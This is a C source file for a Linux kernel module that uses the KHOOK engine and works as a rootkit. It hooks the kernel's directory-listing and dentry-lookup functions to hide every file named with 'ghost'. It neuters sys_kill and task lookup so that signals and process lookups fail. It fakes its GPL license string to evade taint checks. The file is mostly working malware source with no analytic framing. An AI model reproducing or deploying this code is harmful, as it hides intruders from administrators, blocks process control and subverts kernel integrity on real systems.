#include <linux/kernel.h>
#include <linux/module.h>

#include "khook/engine.c"

////////////////////////////////////////////////////////////////////////////////
// An example of using KHOOK
////////////////////////////////////////////////////////////////////////////////

#include <linux/fs.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/sched.h>

#define FLAG 0x80000000

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	
	if (!strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost"))
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
#else
KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, "ghost"))
		found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}

KHOOK_EXT(long, sys_kill, pid_t, int);
static long khook_sys_kill(pid_t pid, int sig) {
        //printk("sys_kill");
        //return KHOOK_ORIGIN(sys_kill, pid, sig);
		return 0;
}

KHOOK(find_task_by_vpid);
struct task_struct *khook_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;
	return tsk;
}
/*
KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs) {
        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
        return KHOOK_ORIGIN(__x64_sys_kill, regs);
}*/



/*KHOOK(inode_permission);
static int khook_inode_permission(struct inode *inode, int mask)
{
	int ret = 0;
s
	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);

	return ret;
}*/

////////////////////////////////////////////////////////////////////////////////
// An example of using KHOOK_EXT
////////////////////////////////////////////////////////////////////////////////

/*#include <linux/binfmts.h>

KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
	printk("%s(%p) = %d\n", __func__, bprm, ret);

	return ret;
}*/

////////////////////////////////////////////////////////////////////////////////

int init_module(void)
{
	return khook_init();
}

void cleanup_module(void)
{
	khook_cleanup();
}

MODULE_LICENSE("GPL\0but who really cares?");
